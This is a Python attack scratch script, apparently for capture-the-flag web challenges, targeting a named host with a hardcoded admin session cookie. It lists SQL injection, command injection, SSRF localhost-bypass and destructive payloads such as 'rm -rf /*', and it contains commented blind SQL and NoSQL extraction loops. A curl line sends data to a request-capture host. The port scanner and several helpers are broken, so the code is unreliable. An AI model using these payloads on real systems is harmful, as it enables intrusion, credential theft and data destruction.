import requests
import re
import string, json
import socket
import os, platform
import threading
from datetime import datetime
import math

host = 'colaf.net'
port = '80'
url = host+':'+port
headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {
        'username': 'admin',
        'sessionid': '20642b2f8484ec17cb44fa25680ead4791ac6bfedc29f04de00d364cf4d70c5f'}
data = {'cmd': 'ls'
        #'host': '8.8.8.8";cat "/app/flag.py'
        }
payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
              'admin\' OR 1 -- -',              # admin' OR 1 -- -
              'admin\' || \'1',                 # and는 &&, or는 ||로 우회
              '" OR "" = "',                    # " OR "" = "
              '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
              '\'=\'',                          # '='
              '\'LIKE\'',                       # 'LIKE'
              '\'=0--+'                         #'=0--+
              ]
payloadCommandInjection = [';ls "."',           # ;ls "."
                           '";ls ".',           # ";ls ".
                           ';pwd',              # ;pwd
                           '";pwd "',           # ";pwd "
                           ';cat /tmp/flag',    # ;cat /tmp/flag
                           '";cat /tmp/flag'    # ";cat /tmp/flag
                           ]
payloadCommand = ['rm ./',
                  'rm -rf ./*',
                  'rm -rf /*',
                  'cp -rf ./* ../',
                  'cat /',
                  'clear',
                  'ping http://localhost',
                  'whois https://naver.com',
                  '가나다']


payloadLocalhost = ['http://localhost',
                    'http://vcap.me',
                    'http://0x7f.0x00.0x00.0x01',
                    'http://0x7f000001',
                    'http://2130706433',
                    'http://Localhost',
                    'http://127.0.0.255'
                    'http://127.1',
                    ]
ALPHANUMERIC = string.digits + string.ascii_letters
flag = ''
def refineResponse(text):
    text = re.sub('<head>(.|\n)*</head>', '', text)
    text = re.sub('\n(\n|\s)*\n', '', text)
    return text
def detector(text):
    regex_flag = re.compile('(DH\{.*\}|Success|error)')
    detectedTexts = regex_flag.findall(response.text)
    return detectedTexts

def printLog(payload, responseText):
    print("================================================================")
    print("payload: " + payload)
    print(response.text)
################################ SCAN   #################################
class Scan(threading.Thread):
    def __init__(self, ip, port_min, port_max):
        self.ip = ip
        self.port_min = port_min
        self.port_max = port_max
        self.OS = platform.system()

        if (self.OS == "Windows"):
            self.ping1 = "ping -n 1 "
        elif (self.OS =="Linux"):
            self.ping1 = "ping -c 1 "
        else:
            self.ping1 = "ping -c 1 "

    def run(self):
        for port in range(self.port_min, self.port_max):
            command = self.ping1 + self.ip + '.' + port
            response = os.popen(command)
            for line in response.readlines():
                if(line.count("TTL")):
                    break

def scan():
    ip_regex = re.compile("(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}")
    # port_regex = re.compile("((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))")
    port_regex = re.compile("\d{1,5}")
    host = input("host: ")
    isValidIp = ip_regex.search(host).group(0)
    isValidPort = True
    if not isValidIp:
        try:
            ip = socket.gethostbyname(host)
        except:
            print('no IP found')
            return
    else:
        ip = ip_regex.findall(host)[0]
        port_min = input("port_min: ")
        print("port_min is ", port_min)
        port_min = int(port_regex.search(port_min).group(0))
        isValidPort = port_min
        print("port_min is ", port_min)

    if not isValidPort:
        port_min = 80
    else:
        port_max = input("port_max: ")
        port_max = int(port_regex.search(port_max).group(0))
        isValidPort = port_max

    if not isValidPort:
        port_max = 80

    start_time = datetime.now()

    n_thread = 20
    step = math.ceil((int(port_max) - int(port_min))/n_thread)
    for index in range(n_thread-2):
        Scan(ip, port_min+index*step, port_min+(index+1)*step)  # port_min+index*step 이상, port_min+index*step 미만
        Scan.start()
    index = n_thread-1
    Scan(ip, port_min+index*step, port_max)
    Scan.start()

scan()
################################ CANVAS  ################################
def existDetector(text):
    regex_exist = re.compile('exists')
    detectedTexts = regex_exist.findall(text)
    return detectedTexts
#pwLength = 0
#for index in range(50):
#    payload = 'admin\' and char_length(upw)='+str(index)+';--'
#    params = {
#        'uid': payload}
#    response = requests.get(url, params = params, verify=False)
#    printLog(payload, refineResponse(response.text))
#    if len(existDetector(response.text))>0:
#        pwLength = index
#        break
#countPw = []
#binaryPw = []
#for nthPw in range(1, pwLength+1):
#    for nthBit in range(128):
#        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
#        params = {'uid': payload}
#        response = requests.get(url, params = params, verify=False)
#        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
#        if len(existDetector(response.text))>0:
#            bitarray = []
#            print(str(nthPw)+'th password: '+str(nthBit))
#            for bit in range(1, nthBit+1):
#                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
#                params = {'uid': payload}
#                response = requests.get(url, params = params, verify=False)
#                if len(existDetector(response.text))>0:
#                    bitarray += '0'
#                else:
#                    bitarray += '1'
#                print(bitarray)
#            binaryPw += bitarray
#            break
#
################################ PALETTE ################################

# response = requests.get(url, params = params, cookies=cookies, verify=False)
# response = requests.post(url, data=data)
# response = requests.head(url, verify=False)
# verify=False SSL 인증서 에러가 나서 추가해줬다.

# Blind injection
#for i in range(32):
#    for char in ALPHANUMERIC:
#        response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
#        if response.text.find('admin')!=-1:
#            flag += char
#            print(str(char))
#            break

################################ HISTORY ################################
#for payload in payloadCommandInjection:
#    data = {'host': '8.8.8.8'+payload}
#    response = requests.post(url, data=data)
#

#if len(regex_flag.findall(response.text))>0:
#    print(regex_flag.findall(response.text))
#else:
#    print(response.text)

#for param in payloadCommand:
#    params = {'cmd': param}
#    print("================================================================")
#    print("Command injection payload: " + param)
#    print(refineResponse(response.text))

# response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
